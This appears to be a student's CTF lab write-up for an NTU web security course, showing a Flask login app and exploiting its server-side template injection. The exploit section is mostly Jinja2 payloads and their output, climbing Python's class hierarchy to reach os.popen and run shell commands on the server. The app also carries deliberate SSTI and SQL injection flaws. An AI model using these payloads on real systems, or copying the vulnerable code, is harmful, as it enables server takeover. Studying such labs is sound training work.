---
title: Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
tags: [CTF, Web, eductf]

category: "Security Course｜NTU CS｜Web"
date: 2023-02-13
---
<!--more-->
# Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
<!-- more -->
###### tags: `CTF` `Web` `eductf`
Challenge: https://login.ctf.zoolab.org/
{% raw %}

## Background
[Web Security 0x1](https://youtu.be/_hasOTGximc?t=5863)

## Source Code
```python
from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///app.db"
db.init_app(app)

with app.app_context():
  db.session.execute("""
    CREATE TABLE IF NOT EXISTS users(
      id Integer PRIMARY KEY,
      username String NOT NULL UNIQUE,
      password String,
      count Integer DEFAULT 0
    );
  """)
  db.session.execute("INSERT OR REPLACE INTO users (username, password) VALUES ('admin', 'FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}')")
  db.session.commit()

def login(greet):
  if not greet:
    return send_file('app.py', mimetype='text/plain')
  else:
    return render_template_string(f"Hello {greet}")

@app.route('/', methods=["GET", "POST"])
def index():
  if request.method == "GET":
    return render_template('index.html')
  else:
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    error = ''
    user = db.session.execute("SELECT username, password FROM users where username=:username", {"username":username}).first()

    if user and user[1] == password:
      return login(request.form.get('greet', ''))
    elif not user:
      error += "User doesn't exist! "

    # New feature! count login failed event
    db.session.execute("UPDATE users SET count = count + 1 WHERE username=:username", {"username": username})
    db.session.commit()
    count = db.session.execute(f"SELECT * FROM users WHERE username='{username}'").first() or [0, 0, 0, 0]
    error += f'Login faild count: {count[3]}'

    return render_template('index.html', error=error)


if __name__ == "__main__":
  app.run(host="0.0.0.0")

```

## Exploit - SSTI
1. Observe source code
    ```python
    def login(greet):
      if not greet:
        return send_file('app.py', mimetype='text/plain')
      else:
        return render_template_string(f"Hello {greet}")
    ...
    if user and user[1] == password:
      return login(request.form.get('greet', ''))
    ```
    If we pass the login page, it'll render `greet` parameter as template data. Obviously `SSTI` problem.
2. Burp Suite
   It really has `SSTI` problem
   ![](https://i.imgur.com/R9uaaBQ.png)
    * Payload: `{{[].__class__}}` → Output: `<class 'list'>`
    * Payload: `{{[].__class__.__base__}}` → Output: `<class 'object'>`
    * Payload: `{{[].__class__.__base__.__subclasses__()}}` → 
        
        ```
        Hello [<class 'type'>
        <class 'async_generator'>
        ...
        <class 'os._wrap_close'>
        ...
        <class 'sqlite3.Connection'>
        <class 'sqlite3.Statement'>
        <class 'sqlite3.PrepareProtocol'>
        <class 'sqlite3.Blob'>]
        ```
        And we need to find `<class 'os._wrap_close'>` which is in line 141 that is in 140-th of list.
    * Payload: `{{[].__class__.__base__.__subclasses__()[140].__init__}}` → Output: `<function _wrap_close.__init__ at 0x7fceecae2a20>`
    * Payload: `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__}}` → 
        ```
        Hello {'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n", '__package__': '', ...
        '__all__': ['altsep', 'curdir', 'pardir', 'sep', 'pathsep', 'linesep', 'defpath', 'name', 'path', 'devnull', 'SEEK_SET', 'SEEK_CUR', 'SEEK_END', 'fsencode', 'fsdecode', 'get_exec_path', 'fdopen', 'extsep', '_exit', 'CLD_CONTINUED', 'CLD_DUMPED', 'CLD_EXITED', 'CLD_KILLED', 'CLD_STOPPED', 'CLD_TRAPPED', 'DirEntry', 'EFD_CLOEXEC', 'EFD_NONBLOCK', 'EFD_SEMAPHORE', 'EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_LOCK', 'F_OK', 'F_TEST', 'F_TLOCK', 'F_ULOCK', 'GRND_NONBLOCK', 'GRND_RANDOM', 'MFD_ALLOW_SEALING', 'MFD_CLOEXEC', 'MFD_HUGETLB', 'MFD_HUGE_16GB', 'MFD_HUGE_16MB', 'MFD_HUGE_1GB', 'MFD_HUGE_1MB', 'MFD_HUGE_256MB', 'MFD_HUGE_2GB', 'MFD_HUGE_2MB', 'MFD_HUGE_32MB', 'MFD_HUGE_512KB', 'MFD_HUGE_512MB', 'MFD_HUGE_64KB', 'MFD_HUGE_8MB', 'MFD_HUGE_MASK', 'MFD_HUGE_SHIFT', 'NGROUPS_MAX', 'O_ACCMODE', 'O_APPEND', 'O_ASYNC', 'O_CLOEXEC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_FSYNC', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_PATH', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TMPFILE', 'O_TRUNC', 'O_WRONLY', 'POSIX_FADV_DONTNEED', 'POSIX_FADV_NOREUSE', 'POSIX_FADV_NORMAL', 'POSIX_FADV_RANDOM', 'POSIX_FADV_SEQUENTIAL', 'POSIX_FADV_WILLNEED', 'POSIX_SPAWN_CLOSE', 'POSIX_SPAWN_DUP2', 'POSIX_SPAWN_OPEN', 'PRIO_PGRP', 'PRIO_PROCESS', 'PRIO_USER', 'P_ALL', 'P_PGID', 'P_PID', 'P_PIDFD', 'RTLD_DEEPBIND', 'RTLD_GLOBAL', 'RTLD_LAZY', 'RTLD_LOCAL', 'RTLD_NODELETE', 'RTLD_NOLOAD', 'RTLD_NOW', 'RWF_APPEND', 'RWF_DSYNC', 'RWF_HIPRI', 'RWF_NOWAIT', 'RWF_SYNC', 'R_OK', 'SCHED_BATCH', 'SCHED_FIFO', 'SCHED_IDLE', 'SCHED_OTHER', 'SCHED_RESET_ON_FORK', 'SCHED_RR', 'SEEK_DATA', 'SEEK_HOLE', 'SPLICE_F_MORE', 'SPLICE_F_MOVE', 'SPLICE_F_NONBLOCK', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TMP_MAX', 'WCONTINUED', 'WCOREDUMP', 'WEXITED', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WNOWAIT', 'WSTOPPED', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'XATTR_CREATE', 'XATTR_REPLACE', 'XATTR_SIZE_MAX', 'X_OK', 'abort', 'access', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'copy_file_range', 'cpu_count', 'ctermid', 'device_encoding', 'dup', 'dup2', 'environ', 'error', 'eventfd', 'eventfd_read', 'eventfd_write', 'execv', 'execve', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fork', 'forkpty', 'fpathconf', 'fspath', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'get_blocking', 'get_inheritable', 'get_terminal_size', 'getcwd', 'getcwdb', 'getegid', 'geteuid', 'getgid', 'getgrouplist', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getpriority', 'getrandom', 'getresgid', 'getresuid', 'getsid', 'getuid', 'getxattr', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'link', 'listdir', 'listxattr', 'lockf', 'login_tty', 'lseek', 'lstat', 'major', 'makedev', 'memfd_create', 'minor', 'mkdir', 'mkfifo', 'mknod', 'nice', 'open', 'openpty', 'pathconf', 'pathconf_names', 'pidfd_open', 'pipe', 'pipe2', 'posix_fadvise', 'posix_fallocate', 'posix_spawn', 'posix_spawnp', 'pread', 'preadv', 'putenv', 'pwrite', 'pwritev', 'read', 'readlink', 'readv', 'register_at_fork', 'remove', 'removexattr', 'rename', 'replace', 'rmdir', 'scandir', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getparam', 'sched_getscheduler', 'sched_param', 'sched_rr_get_interval', 'sched_setaffinity', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'sendfile', 'set_blocking', 'set_inheritable', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setpgid', 'setpgrp', 'setpriority', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'setxattr', 'splice', 'stat', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sync', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'terminal_size', 'times', 'times_result', 'truncate', 'ttyname', 'umask', 'uname', 'uname_result', 'unlink', 'unsetenv', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitid', 'waitid_result', 'waitpid', 'waitstatus_to_exitcode', 'write', 'writev', 'makedirs', 'removedirs', 'renames', 'walk', 'fwalk', 'execl', 'execle', 'execlp', 'execlpe', 'execvp', 'execvpe', 'getenv', 'supports_bytes_environ', 'environb', 'getenvb', 'P_WAIT', 'P_NOWAIT', 'P_NOWAITO', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'popen'], '_exists': <function _exists at 0x7fceecd1dd00>... 'popen': <function popen at 0x7fceecae28e0>, '_wrap_close': <class 'os._wrap_close'>, 'fdopen': <function fdopen at 0x7fceecae2980>, '_fspath': <function _fspath at 0x7fceecae2de0>, 'PathLike': <class 'os.PathLike'>}
        ```
        Then we can open system and write the command
    * Payload: `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['popen']('ls').read()}}` → Output:
        ```
        Hello app.py
        flag
        flag.txt
        instance
        requirements.txt
        templates
        ```
3. Then we got flag!!!
{% endraw %}